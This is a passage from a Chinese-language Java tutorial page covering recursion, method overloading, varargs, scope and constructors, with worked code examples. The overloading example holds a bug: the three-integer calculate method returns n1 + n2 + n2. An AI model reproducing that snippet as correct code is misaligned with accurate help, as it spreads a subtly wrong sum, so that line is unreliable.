“死龟”</li><li>当一个方法执行完毕，或遇到 <code>return</code>就会返回。遵守谁调用，就将结果返回给谁。同时当方法执行完毕或返回时，该方法也就执行完毕。</li></ol><h3 id="递归斐波那契">6.3.3 递归斐波那契</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">T</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">T</span>();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> <span class="hljs-number">7</span>;<span class="hljs-comment">//这里选择输出第几个斐波那契数</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> t1.fibonacci(n);<br>        <span class="hljs-keyword">if</span>(res &gt;= -<span class="hljs-number">1</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;当n = &quot;</span> + n + <span class="hljs-string">&quot; 对应的斐波那契数为：&quot;</span> + res);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    请使用递归的方式求出斐波那契数 1,1,2,3,5,8,13...给你一个整数 n，求出它的斐波那契数</span><br><span class="hljs-comment">    1. 当 n = 1 斐波那契数 是 1</span><br><span class="hljs-comment">    2. 当 n = 2 斐波那契数 是 1</span><br><span class="hljs-comment">    3. 当 n &gt;= 3 斐波那契数 是前两个数的和</span><br><span class="hljs-comment">    4. 这里就是一个递归的思路</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fibonacci</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span>&#123;<br>        <span class="hljs-keyword">if</span>( n &gt;= <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">if</span>( n == <span class="hljs-number">1</span> || n == <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> fibonacci(n-<span class="hljs-number">1</span>) + fibonacci(n-<span class="hljs-number">2</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;要求输入的 n&gt;=1 的整数&quot;</span>);<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="猴子吃桃">*6.3.4 猴子吃桃</h3><h3 id="老鼠出迷宫">*6.3.5 老鼠出迷宫</h3><p>### 6.3.6 汉诺塔问题</p><p>汉诺塔：汉诺塔（又称河内塔）问题是源于印度一个古老传说的益智玩具。大梵天创造世界的时候做了三根金刚石柱子，在一根柱子上从下往上按照大小顺序摞着64片圆盘。大梵天命令婆罗门把圆盘从下面开始按大小顺序重新摆放在另一根柱子上。并且规定，在小圆盘上不能放大圆盘，在三根柱子之间一次只能移动一个圆盘。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Tower</span> <span class="hljs-variable">tower</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Tower</span>();<br>        tower.move(<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tower</span> &#123;<br>    <span class="hljs-comment">//方法</span><br>    <span class="hljs-comment">//num 表示要移动的个数, a, b, c 分别表示 A 塔，B 塔, C 塔</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">move</span><span class="hljs-params">(<span class="hljs-type">int</span> num , <span class="hljs-type">char</span> a, <span class="hljs-type">char</span> b ,<span class="hljs-type">char</span> c)</span> &#123;<br>    <span class="hljs-comment">//如果只有一个盘 num = 1</span><br>        <span class="hljs-keyword">if</span>(num == <span class="hljs-number">1</span>) &#123;<br>            System.out.println(a + <span class="hljs-string">&quot;-&gt;&quot;</span> + c);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//如果有多个盘，可以看成两个 , 最下面的和上面的所有盘(num-1)</span><br>            <span class="hljs-comment">//(1)先移动上面所有的盘到 b, 借助 c</span><br>            move(num - <span class="hljs-number">1</span> , a, c, b);<br><br>            <span class="hljs-comment">//(2)把最下面的这个盘，移动到 c</span><br>            System.out.println(a + <span class="hljs-string">&quot;-&gt;&quot;</span> + c);<br>            <span class="hljs-comment">//(3)再把 b 塔的所有盘，移动到 c ,借助 a</span><br>            move(num - <span class="hljs-number">1</span>, b, a, c);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>不得不承认递归的妙处，真的是有点太妙了</p></blockquote><h3 id="八皇后">*6.3.7 八皇后</h3><h2 id="方法重载">6.4 方法重载</h2><blockquote><p>方法重载（Overload）：Java 中允许同一类中，多个同名方法的存在，但要求形参列表 不一致。</p><p>比如：System.out.println()，out 是 PrintStream 类型</p><p>重载的好处：减轻了起名和记名的麻烦。</p></blockquote><p>一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">MyCalculator</span> <span class="hljs-variable">mc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyCalculator</span>();<br>        System.out.println(mc.calculate(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>));<br>        System.out.println(mc.calculate(<span class="hljs-number">1.1</span>, <span class="hljs-number">2</span>));<br>        System.out.println(mc.calculate(<span class="hljs-number">1</span>, <span class="hljs-number">2.1</span>));<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCalculator</span> &#123;<br>    <span class="hljs-comment">//下面的四个 calculate 方法构成了重载</span><br>    <span class="hljs-comment">//两个整数的和</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculate</span><span class="hljs-params">(<span class="hljs-type">int</span> n1, <span class="hljs-type">int</span> n2)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;calculate(int n1, int n2) 被调用&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> n1 + n2;<br>    &#125;<br>    <span class="hljs-comment">//没有构成方法重载, 仍然是错误的，因为是方法的重复定义</span><br>    <span class="hljs-comment">// public double calculate(int n1, int n2) &#123;</span><br>    <span class="hljs-comment">// System.out.println(&quot;calculate(int n1, int n2) 被调用&quot;);</span><br>    <span class="hljs-comment">// return n1 + n2;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <br>    <span class="hljs-comment">//看看下面是否构成重载, 没有构成，而是方法的重复定义</span><br>    <span class="hljs-comment">// public int calculate(int a1, int a2) &#123;</span><br>    <span class="hljs-comment">// System.out.println(&quot;calculate(int n1, int n2) 被调用&quot;);</span><br>    <span class="hljs-comment">// return a1 + a2;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <br>    <span class="hljs-comment">//一个整数，一个 double 的和</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculate</span><span class="hljs-params">(<span class="hljs-type">int</span> n1, <span class="hljs-type">double</span> n2)</span> &#123;<br>        <span class="hljs-keyword">return</span> n1 + n2;<br>    &#125;<br>    <span class="hljs-comment">//一个 double ,一个 Int 和</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculate</span><span class="hljs-params">(<span class="hljs-type">double</span> n1, <span class="hljs-type">int</span> n2)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;calculate(double n1, int n2) 被调用..&quot;</span>);<br>        <span class="hljs-keyword">return</span> n1 + n2;<br>    &#125;<br>    <span class="hljs-comment">//三个 int 的和</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculate</span><span class="hljs-params">(<span class="hljs-type">int</span> n1, <span class="hljs-type">int</span> n2,<span class="hljs-type">int</span> n3)</span> &#123;<br><br>        <span class="hljs-keyword">return</span> n1 + n2 + n2;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="使用细节-1">6.4.1 使用细节</h3><ol type="1"><li>方法名：必须相同</li><li>形参列表：必须不同（形参的类型、个数、顺序，这其中至少一个不同，参数名无要求）</li><li>返回值：无要求</li></ol><h2 id="可变参数">6.5 可变参数</h2><blockquote><p>Java允许将同一个类中多个同名同功能但参数个数不同的方法，封装成一个方法。</p></blockquote><p>语法：<code>访问修饰符 返回类型 方法名（数据类型... 形参名）&#123;代码块;&#125;</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-comment">//编写一个 main 方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">HspMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HspMethod</span>();<br>        System.out.println(m.sum(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">100</span>)); <span class="hljs-comment">//106</span><br>        System.out.println(m.sum(<span class="hljs-number">1</span>,<span class="hljs-number">19</span>)); <span class="hljs-comment">//20</span><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HspMethod</span> &#123;<br>    <span class="hljs-comment">//可以计算 2 个数的和，3 个数的和 ， 4. 5， 。。</span><br>    <span class="hljs-comment">//可以使用方法重载</span><br>    <span class="hljs-comment">// public int sum(int n1, int n2) &#123;//2 个数的和</span><br>    <span class="hljs-comment">// return n1 + n2;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// public int sum(int n1, int n2, int n3) &#123;//3 个数的和</span><br>    <span class="hljs-comment">// return n1 + n2 + n3;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// public int sum(int n1, int n2, int n3, int n4) &#123;//4 个数的和</span><br>    <span class="hljs-comment">// return n1 + n2 + n3 + n4;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">//.....</span><br>    <span class="hljs-comment">//上面的三个方法名称相同，功能相同, 参数个数不同-&gt; 使用可变参数优化</span><br><br>    <span class="hljs-comment">//1. int... 表示接受的是可变参数，类型是 int ,即可以接收多个 int(0-多)</span><br>    <span class="hljs-comment">//2. 使用可变参数时，可以当做数组来使用 即 nums 可以当做数组</span><br>    <span class="hljs-comment">//3. 遍历 nums 求和即可</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span>... nums)</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;接收的参数个数=&quot;</span> + nums.length);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; nums.length; i++) &#123;<br>            res += nums[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312141658183.png"alt="程序执行结果" /><figcaption aria-hidden="true">程序执行结果</figcaption></figure><h3 id="使用细节-2">6.5.1 使用细节</h3><ol type="1"><li><p>可变参数 的实参可以是 0 个，也可以是 任意多 个。</p></li><li><p>可变参数 的实参可以是数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//细节: 可变参数的实参可以为数组</span><br>       <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br>        <span class="hljs-type">T</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">T</span>();<br>        t1.f1(arr);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">f1</span><span class="hljs-params">(<span class="hljs-type">int</span>... nums)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;长度=&quot;</span> + nums.length);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>可变参数本质就是数组</p><p>因此，出现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m</span><span class="hljs-params">(<span class="hljs-type">int</span>... n)</span>&#123;<span class="hljs-comment">//这个方法与下面的方法不能构成重载</span><br>&#125;<br></code></pre></td></tr></table></figure><p>的场合，不能有方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m</span><span class="hljs-params">(<span class="hljs-type">int</span>[] n)</span>&#123;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>可变参数 和 普通参数 可以一起放在形参列表，但必须保证 可变参数在最后</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m</span><span class="hljs-params">(<span class="hljs-type">double</span> dou, <span class="hljs-type">int</span>... n)</span> &#123;&#125;<br></code></pre></td></tr></table></figure></li><li><p>一个形参列表最多出现 一个 可变参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//下面的写法是错的</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">f3</span><span class="hljs-params">(<span class="hljs-type">int</span>... nums1, <span class="hljs-type">double</span>... nums2)</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="一个练习">6.5.2 一个练习</h3><p>有三个方法，分别实现返回姓名和两门课成绩(总分)，返回姓名和三门课成绩(总分)，返回姓名和五门课成绩(总分)。封装成一个可变参数的方法，类名 HspMethod，方法名 showScore</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-comment">//编写一个 main 方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">HspMethod</span> <span class="hljs-variable">hm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HspMethod</span>();<br>        System.out.println(hm.showScore(<span class="hljs-string">&quot;milan&quot;</span> , <span class="hljs-number">90.1</span>, <span class="hljs-number">80.0</span> ));<br>        System.out.println(hm.showScore(<span class="hljs-string">&quot;terry&quot;</span> , <span class="hljs-number">90.1</span>, <span class="hljs-number">80.0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30.5</span>,<span class="hljs-number">70</span> ));<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HspMethod</span> &#123;<br>    <span class="hljs-comment">//分析 1. 方法名 showScore 2. 形参(String ,double... ) 3. 返回 String</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">showScore</span><span class="hljs-params">(String name ,<span class="hljs-type">double</span>... scores )</span> &#123;<br>        <span class="hljs-type">double</span> <span class="hljs-variable">totalScore</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; scores.length; i++) &#123;<br>            totalScore += scores[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> name + <span class="hljs-string">&quot; 有 &quot;</span> +scores.length + <span class="hljs-string">&quot; 门课的成绩总分为 = &quot;</span> + totalScore;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="作用域">6.6 作用域</h2><ol type="1"><li>在 Java 编程中，主要的变量就是属性（成员变量）和 局部变量。</li><li>我们说的 局部变量 一般是指在成员方法中定义的变量。</li><li>作用域的分类<ul><li>全局变量：也就是属性，作用域为整个类体</li><li>局部变量：除了属性外的其他变量。作用域为定义它的代码块中</li></ul></li><li>全局变量（属性）可以不赋值直接使用，因为有默认值。局部变量必须赋值使用</li></ol><h3 id="使用细节-3">6.6.1 使用细节</h3><ol type="1"><li><p>属性 和 局部变量 可以重名，访问时遵循就近原则</p></li><li><p>在同一作用域中，两个局部变量不能重名</p></li><li><p>属性的生命周期较长。其伴随对象的创建而创建，伴随对象的销毁而销毁。</p><p>局部变量生命周期较短。其伴随代码块的执行而创建，伴随代码块的结束而销毁。</p></li><li><p>作用域不同：</p><ul><li>全局变量/属性 可以被本类使用，也可以被其他类（通过对象）使用。</li><li>局部变量 只能被本类的对应方法中调用</li></ul></li><li><p>全局变量/属性 <strong>可以加</strong> 修饰符（publicprivate....）</p><p>局部变量 <strong>不能加</strong> 修饰符</p></li></ol><h2 id="构造方法构造器">6.7 构造方法、构造器</h2><blockquote><p>构造方法又叫构造器（constructor），是类的一种特殊的方法。它的主要作用是完成对新对象的初始化。它有几个特点：</p><ol type="1"><li>方法名和类名相同</li><li>没有返回值</li><li>在创建对象时，系统会自动的调用该类的构造器完成对象的初始化。</li></ol></blockquote><p>语法：<code>[修饰符] 方法名(形参列表)&#123; 方法体; &#125;</code></p><ol type="1"><li>构造器的修饰符可以默认， 也可以是 public protected private</li><li>构造器没有返回值</li><li>方法名和类名字必须一样</li><li>参数列表 和 成员方法一样的规则</li><li>构造器的调用，由系统完成</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//当我们 new 一个对象时，直接通过构造器指定名字和年龄</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;smith&quot;</span>, <span class="hljs-number">80</span>);<br>        System.out.println(<span class="hljs-string">&quot;p1 的信息如下&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;p1 对象 name = &quot;</span> + p1.name);<span class="hljs-comment">//smith</span><br>        System.out.println(<span class="hljs-string">&quot;p1 对象 age = &quot;</span> + p1.age);<span class="hljs-comment">//80</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">//在创建人类的对象时，就直接指定这个对象的年龄和姓名</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    String name;<br>    <span class="hljs-type">int</span> age;<br>    <span class="hljs-comment">//构造器</span><br><br>    <span class="hljs-comment">//1. 构造器没有返回值, 也不能写 void</span><br>    <span class="hljs-comment">//2. 构造器的名称和类 Person 一样</span><br>    <span class="hljs-comment">//3. (String pName, int pAge) 是构造器形参列表，规则和成员方法一样</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String pName, <span class="hljs-type">int</span> pAge)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;构造器被调用~~ 完成对象的属性初始化&quot;</span>);<br>        name = pName;<br>        age = pAge;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312141726586.png"alt="运行结果" /><figcaption aria-hidden="true">运行结果</figcaption></figure><h3 id="使用细节-4">6.7.1 使用细节</h3><ol type="1"><li><p>构造器本质也是方法。所以，可以构造器重载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    String name;<br>    <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String pName, <span class="hljs-type">int</span> pAge)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;构造器被调用~~ 完成对象的属性初始化&quot;</span>);<br>        name = pName;<br>        age = pAge;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String pName)</span> &#123;<br>        name = pName;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>构造器名 和 类名 相同</p></li><li><p>构造器无返回值</p></li><li><p>构造器是完成对象的初始化，而不是创建</p></li><li><p>创建对象时，系统自动调用该类的构造方法，像上面的，不能<code>p1.Person()</code></p></li><li><p>如果程序员没有定义构造器，系统会自动给类生成一个默认无参构造器（也叫默认构造器）</p></li><li><p>一旦定义了自己的构造器，就不能用无参构造器了。除非显式的定义一个无参构造器</p></li></ol><h3 id="流程分析">6.7.2 流程分析</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino">Person p1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Person</span>(<span class="hljs-string">&quot;Amy&quot;</span>, <span class="hljs-number">10</span>);<br><br>...<br>    <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br><span class="hljs-type">String</span> name;<br><span class="hljs-type">int</span> age = <span class="hljs-number">20</span>;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(<span class="hljs-type">String</span> pName, <span class="hljs-type">int</span> pAge)</span></span>&#123;<br>name = pName;<br>age = pAge;<br>&#125;<br>&#125;JAVA<br></code></pre></td></tr></table></figure><ol type="1"><li><p>加载 类信息（方法区）</p></li><li><p>在 堆 中开辟空间（地址）</p></li><li><p>完成对象初始化</p><ul><li><p>首先默认初始化。<code>age = 0; name = null</code></p></li><li><p>之后显式初始化。<code>age = 20; name = null</code></p><p>其中，显式初始化和代码块初始化按编写的先后顺序依次进行。</p></li><li><p>之后构造器的初始化。<code>age = 10; name = "Amy"</code></p></li></ul></li><li><p>把对象在 堆 中的 地址，返回给 <code>p1</code></p></li></ol><h2 id="this-关键字">6.8 <code>this</code> 关键字</h2><blockquote><p>JVM 会给每个对象分配 this 代表当前对象。</p><p>相当于在 堆 中，this 指向自己（对象）</p><p>在类定义的方法中，Java 会自动用 